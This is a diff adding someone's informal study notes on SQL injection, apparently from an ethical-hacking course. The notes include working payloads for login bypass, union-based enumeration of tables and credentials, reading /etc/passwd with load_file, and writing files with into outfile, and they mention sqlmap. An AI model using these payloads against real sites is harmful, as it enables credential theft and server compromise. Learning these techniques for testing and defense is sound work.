@@ -53,7 +53,41 @@ target shown as hooked in beef console   along with the multiple options that be
 
 select * from accounts where user='user_name' and password='12345' and 1=1 #'
 
-so basically need to inject whatever is the code needed in 1=1 section
+so basically need to inject whatever is the code needed in 1=1 section   then instead of and using or     only or needs to be true
+
+the key is to break the things with ' or stuff and try and see the error or and & 1=1 1=2 true false statements
+
+or inject in user field itself just - select * from 'admin' #    bypassing the login simply
+
+GET is supposed to be idempotent and not supposed to make any persistent changes unlike POST
+
+whenever you see something like .php & parameters injection possibilities are there in the url 
+also can put order by     but while in url # should be replaced by %23   white space is %20  google to get more
+
+getting the shape of table with order by trials and then select * from 'admin' union select 1,2,3,4 # 
+
+but then using 1,user(),database(),version() #
+
+union select 1,table_name,null,null,5 from information_schema.tables     - applies to my sql 
+union select 1,column_name,null,null,5 from information_schema.columns wher table_name='accounts'
+union select 1,username,password,is_admin,5 from accounts
+
+file inclusion
+union select null,load_file('/etc/passwd'),null,null,null 
+union select null,'example example',null,null,null into outfile '/var/www/sitename/example.txt'
+
+sqlmap is the tool for automated injection   sqlmap -u <url>
+
+techniques used for prevention - filters,blacklist, whitelist but they can be bypassed but the best way is parametrization
+
+
+
+
+
+
+
+
+
 
 
 
